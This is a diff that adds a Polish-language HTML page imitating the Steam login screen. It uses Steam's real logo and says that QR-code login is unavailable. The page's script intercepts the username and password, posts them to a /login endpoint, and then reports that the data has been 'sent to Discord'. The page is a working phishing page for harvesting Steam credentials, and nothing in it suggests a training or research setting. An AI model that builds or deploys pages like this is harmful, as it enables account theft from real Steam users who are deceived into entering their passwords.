@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Logowanie Steam</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logbox">
+                <div class="login-box">
+                    <img src="https://community.akamai.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam logo" class="logo">
+                    <h1>Logowanie do Steam</h1>
+                    <form id="loginForm">
+                        <div class="textbox">
+                            <input type="text" id="username" name="username" required>
+                            <label for="username">Login</label>
+                        </div>
+                        <div class="textbox">
+                            <input type="password" id="password" name="password" required>
+                            <label for="password">Password</label>
+                        </div>
+                        <button type="submit" class="btn">Zaloguj</button>
+                        <div class="footer">
+                            <a href="#">Nie pamiętasz hasła?</a>
+                            <a href="#">Załóż konto Steam</a>
+                        </div>
+                    </form>
+                </div>
+                <div class="loginboxqr">
+                    <p class="qrnapis">Za pomocą kodu QR</p>
+                    <img src="qr.png" class="qrkod">
+                    <p class="qrnapis2">Przepraszamy, logowanie za pomocą kodu QR<br> jest w tej chwili niedostępne.</p>
+                </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            axios.post('/login', {
+                username: username,
+                password: password
+            })
+            .then(response => {
+                alert('Dane zostały wysłane na Discord!');
+            })
+            .catch(error => {
+                console.error('Wystąpił błąd:', error);
+            });
+        });
+    </script>
+</body>
+</html>
